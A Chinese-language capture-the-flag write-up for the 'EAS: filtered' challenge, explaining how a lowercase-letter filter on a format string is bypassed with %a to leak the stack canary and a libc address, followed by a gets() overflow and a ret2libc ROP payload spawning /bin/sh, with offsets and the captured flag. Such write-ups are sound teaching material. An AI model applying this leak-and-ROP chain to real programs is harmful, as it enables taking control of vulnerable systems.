# EAS: filtered

## 题目简述

程序仍有格式串，但过滤输入中的小写 m 至 z，试图阻止常见 %p、%s、%n。过滤并未限制 %a；printf 会把参数按双精度十六进制浮点数输出。随后一旦输入非法字符，程序跳到 send_feedback，其中 gets 向 16 字节栈缓冲区读入任意长度数据。利用链是用 %a 泄漏 canary 和 libc，再在反馈处 ret2libc。

## 解题过程

对发布二进制逐项探测后，第 16 个参数是 canary，第 20 个参数是 __libc_start_main 返回地址：

~~~text
%16$a
%20$a
~~~

把十六进制浮点文本转回原始 64 位位模式：

~~~python
import struct

def unhexfloat(s):
    d = float.fromhex(s.decode())
    return struct.unpack("<Q", struct.pack("<d", d))[0]
~~~

随附 glibc 2.31 的返回点为 __libc_start_main+0xf3，即偏移 0x24083。二进制内核实的其余偏移为：

~~~text
system          0x52290
pop rdi; ret    0x23b6a
/bin/sh         0x1b45bd
~~~

输入一个被禁止的小写字符触发 send_feedback，再发送：

~~~python
payload  = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(libc_base + 0x23b6b)  # ret，对齐栈
payload += p64(libc_base + 0x23b6a)
payload += p64(libc_base + 0x1b45bd)
payload += p64(libc_base + 0x52290)
~~~

取得 shell 后得到：

~~~text
maple{P1rn7f_L34K_3v3rY7h1N}
~~~

## 方法总结

黑名单过滤格式说明符很脆弱：%a 虽然输出“浮点数”，仍会泄漏原始参数位模式。利用远程 libc 时必须从附件本身核对返回点和 gadget 偏移；gets 缓冲区到 canary 的距离为 24 字节，不能误按声明的 16 字节直接覆盖。
